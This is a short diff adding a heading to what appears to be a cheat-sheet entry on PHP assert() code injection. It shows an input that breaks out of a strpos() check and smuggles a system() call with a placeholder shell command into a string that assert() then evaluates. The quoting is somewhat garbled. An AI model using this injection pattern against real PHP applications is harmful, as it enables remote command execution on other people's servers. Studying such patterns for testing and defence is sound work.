@@ -1,3 +1,5 @@
+# PHP - assert()
+
 (strpos('includes/', ww', 'r') == true or system('**shell**') and strpos('1.php', '..') === false)  = true</br>
 
 ==> assert("strpos('includes/', ww', 'r') == true or system('**shell**') and strpos('1.php', '..') === false") run
